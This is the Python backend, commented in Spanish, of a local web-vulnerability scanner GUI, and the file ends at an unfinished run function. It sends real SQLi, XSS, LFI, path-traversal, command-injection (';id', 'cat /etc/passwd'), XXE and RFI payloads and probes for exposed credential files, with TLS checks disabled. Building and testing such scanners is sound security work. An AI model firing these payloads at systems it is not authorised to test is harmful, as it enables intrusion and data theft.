#!/usr/bin/env python3
"""ht_scanner - backend del scanner GUI de hacking team.
Sirve una web local y ejecuta escaneos REALES (no fake) contra objetivos
autorizados / labs propios. Solo fines educativos / CTF local.

Modulos: headers, archivos, rutas, SQLi, IDOR, XSS, tech
+ soporte de plantillas YAML compatibles con Nuclei (requests definidos por el usuario)
+ control de pausa / reanudar / saltar modulo en vivo.

El frontend pide /api/scan?target=... y recibe eventos via SSE (text/event-stream).
El control (pausar/continuar/saltar) se hace con /api/control?action=...&scan_id=...
"""
import json
import os
import ssl
import urllib.request
import urllib.parse
import urllib.error
import time
import re
import threading
import uuid
import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer, ThreadingHTTPServer
from http.server import SimpleHTTPRequestHandler

try:
    import yaml
    HAS_YAML = True
except Exception:
    HAS_YAML = False

import pdfgen

ROOT = os.path.dirname(os.path.abspath(__file__))
PORT = 8777
REPORTS_DIR = os.path.join(ROOT, "reports")
os.makedirs(REPORTS_DIR, exist_ok=True)

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0 Safari/537.36")

# Wordlists
SENSITIVE = [".env", ".env.local", ".git/config", "wp-config.php", "phpinfo.php",
             "robots.txt", "sitemap.xml", ".well-known/security.txt", "backup.zip",
             "config.php", "xmlrpc.php", "admin/", "login/", "dashboard/",
             "api/", ".aws/credentials"]
ROUTES = ["admin", "login", "dashboard", "api", "config", "panel", "wp-admin",
          "phpmyadmin", "uploads", "backup", ".git", "test", "dev", "staging"]

SQLI_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1-- -",
                 "admin' -- -", "0 UNION SELECT 1,2-- -"]
IDOR_PAYLOADS = ["1", "2", "3", "0", "999", "../../etc/passwd"]
XSS_PAYLOADS_DEFAULT = ["<script>alert(1)</script>", "\"<script>alert(1)</script>",
                        "<img src=x onerror=alert(1)>", "'><svg/onload=alert(1)>"]

# Registro de escaneos activos: scan_id -> dict de control
SCANS = {}
SCANS_LOCK = threading.Lock()

# Servidor OOB local para detectar RFI/XXE out-of-band (callback)
# Se levanta un socket TCP que espera un token unico. Si llega, hubo exfiltracion.
OOB_TOKEN = None
OOB_HIT = threading.Event()
OOB_SERVER = None


def start_oob():
    """Levanta un servidor TCP local que escucha un token. Devuelve (host, port, token)."""
    global OOB_TOKEN, OOB_HIT, OOB_SERVER
    import socket
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(5)
    port = srv.getsockname()[1]
    token = "HTSCN" + uuid.uuid4().hex[:12]
    OOB_TOKEN = token
    OOB_HIT.clear()
    OOB_SERVER = srv

    def acceptor():
        srv.settimeout(0.5)
        while not OOB_HIT.is_set():
            try:
                conn, _ = srv.accept()
            except Exception:
                continue
            try:
                data = conn.recv(4096).decode("utf-8", "replace")
                if token in data:
                    OOB_HIT.set()
            except Exception:
                pass
            finally:
                try: conn.close()
                except Exception: pass

    threading.Thread(target=acceptor, daemon=True).start()
    return "127.0.0.1", port, token


def stop_oob():
    global OOB_SERVER
    if OOB_SERVER:
        try: OOB_SERVER.close()
        except Exception: pass
        OOB_SERVER = None


def wait_oob(timeout=4):
    return OOB_HIT.wait(timeout)


def wait_oob_responsive(scan_id, current_module, timeout=1.2):
    """Espera el callback OOB pero chequea skip/stop cada 0.1s para respuesta rapida."""
    end = time.time() + timeout
    while time.time() < end:
        if OOB_HIT.is_set():
            return True
        ctrl = check_control(scan_id, current_module)
        if ctrl in ("skip", "stop"):
            return False
        time.sleep(0.1)
    return OOB_HIT.is_set()


def sleep_ctrl(scan_id, current_module, seconds):
    """Duerme pero interrumpe si hay skip/stop (para que el boton SALTAR responda ya)."""
    end = time.time() + seconds
    while time.time() < end:
        ctrl = check_control(scan_id, current_module)
        if ctrl in ("skip", "stop"):
            return ctrl
        time.sleep(0.05)
    return "run"


def req(method, url, data=None, cookie=None, timeout=10, raw=False):
    hdr = {"User-Agent": UA, "Accept": "*/*"}
    if cookie:
        hdr["Cookie"] = cookie
    if method.upper() == "GET":
        if data:
            sep = "&" if "?" in url else "?"
            url = url + sep + urllib.parse.urlencode(data)
        body = None
    else:
        if raw:
            body = data.encode() if isinstance(data, str) else data
            hdr["Content-Type"] = "text/xml; charset=utf-8"
        else:
            body = urllib.parse.urlencode(data).encode() if data else b""
            hdr["Content-Type"] = "application/x-www-form-urlencoded"
    r = urllib.request.Request(url, data=body, headers=hdr, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=SSL_CTX)
        return {"code": resp.getcode(), "body": resp.read().decode("utf-8", "replace"),
                "headers": dict(resp.getheaders()), "err": None}
    except urllib.error.HTTPError as e:
        return {"code": e.code, "body": e.read().decode("utf-8", "replace"),
                "headers": dict(e.headers), "err": None}
    except Exception as e:
        return {"code": 0, "body": "", "headers": {}, "err": str(e)}


def check_control(scan_id, current_module):
    """Lee el estado de control del escaneo. Devuelve ('run'|'skip'|'stop')."""
    with SCANS_LOCK:
        st = SCANS.get(scan_id)
        if not st:
            return "run"
        if st.get("action") == "stop":
            return "stop"
        if st.get("skip_module") == current_module:
            st["skip_module"] = None
            return "skip"
        # pausa: esperar hasta que action cambie o se reanude
        while st.get("action") == "pause":
            time.sleep(0.2)
            if st.get("action") == "stop":
                return "stop"
            if st.get("skip_module") == current_module:
                st["skip_module"] = None
                return "skip"
        return "run"


def run_nuclei_templates(scan_id, target, templates, bus, emit):
    """Ejecuta plantillas YAML estilo Nuclei (formato simplificado)."""
    if not HAS_YAML:
        emit({"type": "module", "name": "nuclei", "status": "done",
              "msg": "PyYAML no instalado. Instala con: pip install pyyaml"})
        return
    hits = []
    for tmpl in templates:
        name = tmpl.get("id", "template")
        reqs = tmpl.get("requests", [])
        for r in reqs:
            ctrl = check_control(scan_id, "nuclei")
            if ctrl == "stop":
                emit({"type": "module", "name": "nuclei", "status": "done", "msg": "detenido"})
                return
            if ctrl == "skip":
                break
            method = (r.get("method") or "GET").upper()
            path = r.get("path") or "/"
            full = target.rstrip("/") + path
            # matchers
            matchers = r.get("matchers", [])
            rr = req(method, full)
            match = True
            if matchers:
                match = False
                for m in matchers:
                    mtype = m.get("type")
                    mpart = m.get("part", "body")
                    mwords = m.get("words", [])
                    mstatus = m.get("status", [])
                    content = rr.get("body", "") if mpart in ("body", "raw") else json.dumps(rr.get("headers", {}))
                    if mtype == "word" and any(w.lower() in content.lower() for w in mwords):
                        match = True
                    if mtype == "status" and rr.get("code") in mstatus:
                        match = True
            if match:
                hits.append(name)
                emit({"type": "finding", "severity": (tmpl.get("severity") or "info"),
                      "module": "nuclei", "detail": f"Template '{name}' coincide en {full} (HTTP {rr['code']})"})
        if hits:
            break
    emit({"type": "module", "name": "nuclei", "status": "done",
          "msg": f"Nuclei: {len(hits)} plantilla(s) coincidente(s)"})


def load_templates_from_yaml(text):
    """Carga plantillas tipo Nuclei (dict o lista de dicts)."""
    if not HAS_YAML:
        return []
    try:
        data = yaml.safe_load(text)
    except Exception:
        return []
    if isinstance(data, dict):
        return [data]
    if isinstance(data, list):
        return data
    return []


def load_payloads_from_txt(text):
    """Carga payloads desde .txt con secciones opcionales:
    [SQLi]
    '
    [XSS]
    <script>alert(1)</script>
    [IDOR]
    1
    Las lineas fuera de seccion se aplican a los tres tipos.
    """
    out = {"sqli": [], "xss": [], "idor": []}
    current = None
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        low = line.lower()
        if low in ("[sqli]", "[sql]", "[sql injection]"):
            current = "sqli"; continue
        if low in ("[xss]",):
            current = "xss"; continue
        if low in ("[idor]",):
            current = "idor"; continue
        if current:
            out[current].append(line)
        else:
            out["sqli"].append(line)
            out["xss"].append(line)
            out["idor"].append(line)
    for k in out:
        out[k] = [p for p in out[k] if p]
    return out


def scan_target(scan_id, target, bus, templates=None, payloads=None, mode="active"):
    """Ejecuta modulos y emite eventos. Soporta control de pausa/saltar/stop.
    mode='active'  -> ejecuta todos los modulos (incluye envio de payloads)
    mode='passive' -> solo recon (headers, archivos, rutas, tech) sin atacar
    payloads -> dict con listas 'sqli'/'xss'/'idor' para usar en vez de las por defecto.
    """
    def emit(ev):
        bus(ev)
        # Recolectar datos para el reporte PDF
        if ev.get("type") == "finding":
            report_data["findings"].append({
                "severity": ev.get("severity", "low"),
                "module": ev.get("module", ""),
                "detail": ev.get("detail", ""),
            })
        elif ev.get("type") == "module" and ev.get("status") == "done":
            report_data["modules_list"].append({
                "name": ev.get("name", ""),
                "ok": True,
                "msg": ev.get("msg", ""),
            })

    report_data = {
        "findings": [],
        "modules_list": [],
        "system": {"host": "", "server": "", "tech": "", "ports": ""},
    }

    if not target.startswith("http"):
        target = "http://" + target
    mods = ["headers", "archivos", "rutas", "sqli", "idor", "xss", "lfi",
            "traversal", "rfi", "rce", "xxe", "tech"]
    if templates:
        mods = mods + ["nuclei"]
    # Modo pasivo: no enviar payloads (solo superficie)
    if mode == "passive":
        mods = [m for m in mods if m not in ("sqli", "idor", "xss")]
        emit({"type": "mode", "mode": "passive", "msg": "Modo PASIVO: solo recon, sin enviar payloads de ataque"})
    else:
        emit({"type": "mode", "mode": "active", "msg": "Modo ACTIVO: recon + envio de payloads"})
    total = len(mods)
    done = 0

    # Servidor OOB para RFI/XXE (callback local)
    oob_host, oob_port, oob_token = start_oob()
    sqli_list = (payloads or {}).get("sqli") or SQLI_PAYLOADS
    xss_list = (payloads or {}).get("xss") or XSS_PAYLOADS_DEFAULT
    idor_list = (payloads or {}).get("idor") or IDOR_PAYLOADS

    # 1) HEADERS
    ctrl = check_control(scan_id, "headers")
    if ctrl == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "headers", "status": "running", "msg": f"Analizando cabeceras de {target}..."})
    r = req("GET", target)
    issues = []
    h = r.get("headers", {})
    if "strict-transport-security" not in (k.lower() for k in h):
        issues.append("Falta HSTS")
    if "content-security-policy" not in (k.lower() for k in h):
        issues.append("Falta CSP")
    if h.get("x-frame-options") is None and h.get("X-Frame-Options") is None:
        issues.append("Falta X-Frame-Options (clickjacking)")
    if h.get("server"):
        issues.append(f"Server expuesto: {h.get('server')}")
        report_data["system"]["server"] = h.get("server")
    try:
        report_data["system"]["host"] = urllib.parse.urlparse(target).netloc
    except Exception:
        pass
    emit({"type": "module", "name": "headers", "status": "done",
          "msg": f"HTTP {r['code']} | hallazgos: {', '.join(issues) if issues else 'ninguno'}", "findings": issues})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 2) ARCHIVOS
    if check_control(scan_id, "archivos") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "archivos", "status": "running", "msg": "Buscando archivos sensibles expuestos..."})
    found = []
    for f in SENSITIVE:
        if check_control(scan_id, "archivos") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        if check_control(scan_id, "archivos") == "skip":
            break
        rr = req("GET", target.rstrip("/") + "/" + f)
        if rr["code"] in (200, 403) and rr["err"] is None:
            found.append(f"{f} ({rr['code']})")
            emit({"type": "finding", "severity": "medium", "module": "archivos", "detail": f"{f} accesible -> HTTP {rr['code']}"})
        time.sleep(0.05)
    emit({"type": "module", "name": "archivos", "status": "done", "msg": f"Encontrados: {len(found)}", "findings": found})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 3) RUTAS
    if check_control(scan_id, "rutas") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "rutas", "status": "running", "msg": "Enumerando rutas/endpoints..."})
    rfound = []
    for rt in ROUTES:
        if check_control(scan_id, "rutas") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        if check_control(scan_id, "rutas") == "skip":
            break
        rr = req("GET", target.rstrip("/") + "/" + rt)
        if rr["code"] in (200, 301, 302, 403) and rr["err"] is None:
            rfound.append(f"/{rt} ({rr['code']})")
            emit({"type": "finding", "severity": "low", "module": "rutas", "detail": f"/{rt} -> HTTP {rr['code']}"})
        time.sleep(0.05)
    emit({"type": "module", "name": "rutas", "status": "done", "msg": f"Rutas: {len(rfound)}", "findings": rfound})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    if mode == "active":
        # 4) SQLi
        if check_control(scan_id, "sqli") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        emit({"type": "module", "name": "sqli", "status": "running", "msg": "Probando inyeccion SQL en parametros GET..."})
        sqli_hits = []
        SQLI_ERRORS = ["error in your sql", "sql syntax", "sqlite", "you have an error",
                       "unclosed quotation mark", "sqlstate", "ora-", "pg_", "warning: mysqli",
                       "microsoft sql server", "syntax error", "near \"", "unrecognized token",
                       "operationalerror", "database error", "could not"]
        sqli_paths = ["", "/notes", "/doc", "/article", "/view", "/product", "/item", "/post", "/news"]
        for sp in sqli_paths:
            base_url = target.rstrip("/") + sp
            for param in ["id", "q", "page", "search", "note", "cat", "pid"]:
                base = req("GET", base_url, {param: "1"})
                base_len = len(base.get("body", ""))
                base_code = base.get("code")
                for p in sqli_list:
                    if check_control(scan_id, "sqli") == "stop":
                        emit({"type": "done", "summary": "Escaneo detenido"}); return
                    if check_control(scan_id, "sqli") == "skip":
                        break
                    rr = req("GET", base_url, {param: p})
                    body_l = rr.get("body", "").lower()
                    hit = False
                    if any(s in body_l for s in SQLI_ERRORS):
                        hit = True
                    elif rr.get("code") != base_code and rr.get("code") != 0:
                        hit = True
                    elif abs(len(rr.get("body", "")) - base_len) > 80:
                        hit = True
                    if hit:
                        sqli_hits.append(f"{sp or '/'}{param}={p}")
                        emit({"type": "finding", "severity": "high", "module": "sqli",
                              "detail": f"Posible SQLi en '{base_url}' param '{param}' con: {p}"})
                        break
                    time.sleep(0.03)
                if sqli_hits:
                    break
            if sqli_hits:
                break
        emit({"type": "module", "name": "sqli", "status": "done", "msg": f"SQLi: {len(sqli_hits)} hallazgo(s)", "findings": sqli_hits})
        done += 1
        emit({"type": "progress", "done": done, "total": total})

        # 5) IDOR
        if check_control(scan_id, "idor") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        emit({"type": "module", "name": "idor", "status": "running", "msg": "Probando IDOR (enumeracion de objetos por id)..."})
        idor_hits = []
        idor_paths = ["", "/doc", "/note", "/file", "/user", "/account", "/profile", "/view"]
        for ip in idor_paths:
            base_url = target.rstrip("/") + ip
            for idparam in ["id", "doc", "uid", "user", "file", "pid"]:
                for pid in idor_list:
                    if check_control(scan_id, "idor") == "stop":
                        emit({"type": "done", "summary": "Escaneo detenido"}); return
                    if check_control(scan_id, "idor") == "skip":
                        break
                    rr = req("GET", base_url, {idparam: pid})
                    if (rr.get("code") == 200 and len(rr.get("body", "")) > 30
                            and "not found" not in rr.get("body", "").lower()
                            and "404" not in rr.get("body", "")):
                        idor_hits.append(f"{ip or '/'}{idparam}={pid}")
                        emit({"type": "finding", "severity": "medium", "module": "idor",
                              "detail": f"Objeto {base_url} {idparam}={pid} accesible (revisar control de acceso)"})
                        break
                if idor_hits:
                    break
            if idor_hits:
                break
        emit({"type": "module", "name": "idor", "status": "done", "msg": f"IDOR: {len(idor_hits)} sospechoso(s)", "findings": idor_hits})
        done += 1
        emit({"type": "progress", "done": done, "total": total})

        # 6) XSS
        if check_control(scan_id, "xss") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        emit({"type": "module", "name": "xss", "status": "running", "msg": "Probando XSS reflejado en parametros GET..."})
        xss_hits = []
        XSS_PATHS = ["", "/search", "/buscar", "/q", "/s", "/find"]
        for xp in XSS_PATHS:
            base_url = target.rstrip("/") + xp
            for param in ["q", "search", "s", "id", "name", "term"]:
                for p in xss_list:
                    if check_control(scan_id, "xss") == "stop":
                        emit({"type": "done", "summary": "Escaneo detenido"}); return
                    if check_control(scan_id, "xss") == "skip":
                        break
                    rr = req("GET", base_url, {param: p})
                    if p in (rr.get("body", "") or "") and rr.get("code") == 200:
                        xss_hits.append(f"{base_url} {param}")
                        emit({"type": "finding", "severity": "high", "module": "xss",
                              "detail": f"XSS reflejado en '{base_url}' param '{param}': payload no filtrado"})
                        break
                if xss_hits:
                    break
            if xss_hits:
                break
        emit({"type": "module", "name": "xss", "status": "done", "msg": f"XSS: {len(xss_hits)} hallazgo(s)", "findings": xss_hits})
        done += 1
        emit({"type": "progress", "done": done, "total": total})
    else:
        # Modo pasivo: omitir ataque, marcar como omitido para keep progreso consistente
        for nm in ("sqli", "idor", "xss"):
            emit({"type": "module", "name": nm, "status": "done", "msg": "Omitido (modo pasivo)"})
            done += 1
            emit({"type": "progress", "done": done, "total": total})

    # 7) LFI (Local File Inclusion) - parametros que cargan archivos locales
    if check_control(scan_id, "lfi") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "lfi", "status": "running", "msg": "Probando LFI (inclusion de archivos locales)..."})
    lfi_hits = []
    LFI_ROUTES = ["", "/file", "/page", "/index.php", "/view", "/download", "/read"]
    LFI_PARAMS = ["file", "page", "path", "inc", "include", "lang", "doc", "view", "template"]
    LFI_PAYLOADS = ["/etc/passwd", "../../../../../../etc/passwd",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "expect://id", "data://text/plain;base64,SSBsb3ZlIGh0"]
    for rt in LFI_ROUTES:
        base_url = target.rstrip("/") + rt
        for param in LFI_PARAMS:
            for p in LFI_PAYLOADS:
                if check_control(scan_id, "lfi") == "stop":
                    emit({"type": "done", "summary": "Escaneo detenido"}); return
                if check_control(scan_id, "lfi") == "skip":
                    break
                rr = req("GET", base_url, {param: p})
                if rr.get("code") == 200 and ("root:" in rr.get("body", "") or
                                               "bin/bash" in rr.get("body", "") or
                                               "<?php" in rr.get("body", "")):
                    lfi_hits.append(f"{rt or '/'}{param}={p}")
                    emit({"type": "finding", "severity": "high", "module": "lfi",
                          "detail": f"LFI en '{base_url}' param '{param}' con: {p} (contenido de archivo expuesto)"})
                    break
                time.sleep(0.02)
            if lfi_hits:
                break
        if lfi_hits:
            break
    emit({"type": "module", "name": "lfi", "status": "done", "msg": f"LFI: {len(lfi_hits)} hallazgo(s)", "findings": lfi_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 8) Path Traversal (directory traversal directo en rutas/params)
    if check_control(scan_id, "traversal") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "traversal", "status": "running", "msg": "Probando Path Traversal (../)..."})
    trv_hits = []
    TRV_ROUTES = ["", "/download", "/file"]
    TRV_PARAMS = ["file", "path", "name", "img"]
    TRV_PAYLOADS = ["../../../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                    "....//....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
    for rt in TRV_ROUTES:
        base_url = target.rstrip("/") + rt
        for param in TRV_PARAMS:
            for p in TRV_PAYLOADS:
                if check_control(scan_id, "traversal") == "stop":
                    emit({"type": "done", "summary": "Escaneo detenido"}); return
                if check_control(scan_id, "traversal") == "skip":
                    break
                rr = req("GET", base_url, {param: p})
                if rr.get("code") == 200 and ("root:" in rr.get("body", "") or
                                               "[extensions]" in rr.get("body", "") or
                                               "for 16-bit app support" in rr.get("body", "").lower()):
                    trv_hits.append(f"{rt or '/'}{param}={p}")
                    emit({"type": "finding", "severity": "high", "module": "traversal",
                          "detail": f"Path Traversal en '{base_url}' param '{param}' con: {p}"})
                    break
                time.sleep(0.02)
            if trv_hits:
                break
        if trv_hits:
            break
    emit({"type": "module", "name": "traversal", "status": "done", "msg": f"Traversal: {len(trv_hits)} hallazgo(s)", "findings": trv_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 9) RFI (Remote File Inclusion) - incluye un recurso externo controlado
    if check_control(scan_id, "rfi") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "rfi", "status": "running", "msg": "Probando RFI (inclusion remota) via callback OOB..."})
    rfi_hits = []
    RFI_TARGETS = ["/include"]
    RFI_PARAMS = ["url"]
    # URL del callback local: el server objetivo intentaria cargar este recurso
    cb_url = f"http://{oob_host}:{oob_port}/{oob_token}.txt"
    for rt in RFI_TARGETS:
        base_url = target.rstrip("/") + rt
        for param in RFI_PARAMS:
            for p in [cb_url]:
                if check_control(scan_id, "rfi") == "stop":
                    emit({"type": "done", "summary": "Escaneo detenido"}); return
                if check_control(scan_id, "rfi") == "skip":
                    break
                rr = req("GET", base_url, {param: p}, timeout=5)
                if wait_oob_responsive(scan_id, "rfi", 1.2):
                    rfi_hits.append(f"{rt or '/'}{param}={p}")
                    emit({"type": "finding", "severity": "high", "module": "rfi",
                          "detail": f"RFI OOB en '{base_url}' param '{param}': el servidor intento cargar {p}"})
                    break
                time.sleep(0.01)
            if rfi_hits:
                break
        if rfi_hits:
            break
    emit({"type": "module", "name": "rfi", "status": "done", "msg": f"RFI: {len(rfi_hits)} hallazgo(s) (OOB)", "findings": rfi_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 10) RCE (command injection en parametros)
    if check_control(scan_id, "rce") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "rce", "status": "running", "msg": "Probando RCE (inyeccion de comandos)..."})
    rce_hits = []
    RCE_ROUTES = ["", "/ping", "/cmd", "/exec", "/run", "/api/exec", "/cgi-bin/test"]
    RCE_PARAMS = ["cmd", "command", "exec", "query", "ip", "host", "ping", "url", "input", "q"]
    RCE_PAYLOADS = [";id", "|id", "`id`", "$(id)", "&&id", "; cat /etc/passwd",
                    "| whoami", "';id;'", "||id", "& echo HTSCNRCE"]
    for rt in RCE_ROUTES:
        base_url = target.rstrip("/") + rt
        if rce_hits: break
        for param in RCE_PARAMS:
            if rce_hits: break
            for p in RCE_PAYLOADS:
                if check_control(scan_id, "rce") == "stop":
                    emit({"type": "done", "summary": "Escaneo detenido"}); return
                if check_control(scan_id, "rce") == "skip":
                    break
                rr = req("GET", base_url, {param: p}, timeout=5)
                body = (rr.get("body", "") or "")
                if ("uid=" in body and "gid=" in body) or "HTSCNRCE" in body or \
                   ("root:x:" in body and len(body) > 50):
                    rce_hits.append(f"{rt or '/'}{param}={p}")
                    emit({"type": "finding", "severity": "critical", "module": "rce",
                          "detail": f"RCE en '{base_url}' param '{param}' con: {p}"})
                    break
                time.sleep(0.02)
    emit({"type": "module", "name": "rce", "status": "done", "msg": f"RCE: {len(rce_hits)} hallazgo(s)", "findings": rce_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 11) XXE (XML External Entity) - OOB via callback local
    if check_control(scan_id, "xxe") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "xxe", "status": "running", "msg": "Probando XXE (entidad externa) via callback OOB..."})
    xxe_hits = []
    XXE_ENDPOINTS = ["/", "/xml"]
    payload = (
        f'<?xml version="1.0"?>'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_host}:{oob_port}/{oob_token}">]>'
        f'<foo>&xxe;</foo>'
    )
    for ep in XXE_ENDPOINTS:
        if check_control(scan_id, "xxe") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        if check_control(scan_id, "xxe") == "skip":
            break
        rr = req("POST", target.rstrip("/") + ep, data=payload, raw=True, timeout=5)
        if wait_oob_responsive(scan_id, "xxe", 1.2):
            xxe_hits.append(ep or "/")
            emit({"type": "finding", "severity": "high", "module": "xxe",
                  "detail": f"XXE OOB en '{ep or '/'}' (el parser solicitó recurso externo)"})
            break
        time.sleep(0.02)
    emit({"type": "module", "name": "xxe", "status": "done", "msg": f"XXE: {len(xxe_hits)} hallazgo(s) (OOB)", "findings": xxe_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    stop_oob()

    # 12) TECH
    if check_control(scan_id, "tech") == "stop":
        emit({"type": "done", "summary": "Escaneo detenido"}); return
    emit({"type": "module", "name": "tech", "status": "running", "msg": "Detectando tecnologia (server, CMS, frameworks)..."})
    tech_hits = []
    rh = req("GET", target)
    h = rh.get("headers", {})
    server_hdr = h.get("server") or h.get("Server")
    if server_hdr:
        tech_hits.append(f"Server: {server_hdr}")
    powered = h.get("x-powered-by") or h.get("X-Powered-By")
    if powered:
        tech_hits.append(f"Powered-by: {powered}")
    body_l = (rh.get("body", "") or "").lower()
    if "wordpress" in body_l:
        tech_hits.append("CMS: WordPress")
    if "drupal" in body_l:
        tech_hits.append("CMS: Drupal")
    if "laravel" in body_l or "csrf-token" in body_l:
        tech_hits.append("Framework: Laravel/PHP")
    if "next.js" in body_l or "_next" in body_l:
        tech_hits.append("Framework: Next.js")
    if "react" in body_l:
        tech_hits.append("Framework: React")
    if "jquery" in body_l:
        tech_hits.append("Lib: jQuery")
    report_data["system"]["tech"] = ", ".join(tech_hits) if tech_hits else "no detectada"
    emit({"type": "module", "name": "tech", "status": "done", "msg": f"Tech: {len(tech_hits)} senal(es)", "findings": tech_hits})
    done += 1
    emit({"type": "progress", "done": done, "total": total})

    # 8) NUCLEI (plantillas YAML del usuario)
    if templates:
        if check_control(scan_id, "nuclei") == "stop":
            emit({"type": "done", "summary": "Escaneo detenido"}); return
        emit({"type": "module", "name": "nuclei", "status": "running", "msg": "Ejecutando plantillas YAML (estilo Nuclei)..."})
        run_nuclei_templates(scan_id, target, templates, bus, emit)
        done += 1
        emit({"type": "progress", "done": done, "total": total})

    # --- Generar reporte PDF firmado por hacking team ---
    try:
        report_data["target"] = target
        report_data["fecha"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        report_data["mode"] = mode
        report_data["modulos"] = total
        pdf_path = os.path.join(REPORTS_DIR, f"{scan_id}.pdf")
        pdfgen.generate_report(report_data, pdf_path)
        emit({"type": "report", "path": pdf_path,
              "msg": f"Reporte PDF generado: {os.path.basename(pdf_path)}"})
    except Exception as e:
        emit({"type": "error", "msg": f"No se pudo generar el PDF: {e}"})

    emit({"type": "done", "target": target, "summary": f"Escaneo completado. Modulos: {total}. Revisa los hallazgos."})


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, *a, **k):
        super().__init__(*a, directory=ROOT, **k)

    def do_GET(self):
        if self.path.startswith("/api/report?"):
            qs = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(qs)
            scan_id = params.get("scan_id", [""])[0]
            path = os.path.join(REPORTS_DIR, f"{scan_id}.pdf")
            if os.path.exists(path):
                with open(path, "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "application/pdf")
                self.send_header("Content-Disposition",
                                 f'attachment; filename="HTScanner_{scan_id}.pdf"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404)
                self.end_headers()
            return

        if self.path.startswith("/api/scan?"):
            qs = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(qs)
            target = params.get("target", [""])[0]
            scan_id = str(uuid.uuid4())[:8]
            with SCANS_LOCK:
                SCANS[scan_id] = {"action": "run", "skip_module": None}
            # Cargar plantillas YAML si se pasan por ?templates=<contenido urlencoded>
            templates = None
            raw = params.get("templates", [""])[0]
            if raw:
                templates = load_templates_from_yaml(urllib.parse.unquote(raw))
            # Cargar payloads .txt si se pasan por ?payloads=<contenido urlencoded>
            payloads = None
            praw = params.get("payloads", [""])[0]
            if praw:
                payloads = load_payloads_from_txt(urllib.parse.unquote(praw))
            # Modo activo/pasivo
            mode = params.get("mode", ["active"])[0]
            if mode not in ("active", "passive"):
                mode = "active"
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Cache-Control", "no-cache")
            self.send_header("Connection", "keep-alive")
            self.end_headers()

            def bus(ev):
                try:
                    self.wfile.write(f"data: {json.dumps(ev)}\n\n".encode())
                    self.wfile.flush()
                except Exception:
                    pass

            # Emitir el scan_id para que el frontend pueda enviar controles
            try:
                self.wfile.write(f"data: {json.dumps({'type': 'scan_id', 'scan_id': scan_id})}\n\n".encode())
                self.wfile.flush()
            except Exception:
                pass

            try:
                scan_target(scan_id, target, bus, templates, payloads, mode)
            except Exception as e:
                bus({"type": "error", "msg": str(e)})
            try:
                self.wfile.write(b"event: end\ndata: {}\n\n")
                self.wfile.flush()
            except Exception:
                pass
            with SCANS_LOCK:
                SCANS.pop(scan_id, None)
            return

        if self.path.startswith("/api/control?"):
            qs = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(qs)
            scan_id = params.get("scan_id", [""])[0]
            action = params.get("action", [""])[0]
            mod = params.get("module", [""])[0]
            with SCANS_LOCK:
                st = SCANS.get(scan_id)
                if st:
                    if action in ("pause", "resume", "stop"):
                        st["action"] = action if action != "resume" else "run"
                    if action == "skip" and mod:
                        st["skip_module"] = mod
                    ok = True
                else:
                    ok = False
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok, "scan_id": scan_id, "action": action}).encode())
            return

        return super().do_GET()

    def do_POST(self):
        # Permite subir el YAML por POST (mas limpio que por URL)
        if self.path == "/api/templates":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8", "replace")
            templates = load_templates_from_yaml(body)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"ok": True, "templates": len(templates)}).encode())
            return
        return super().do_POST()


def run():
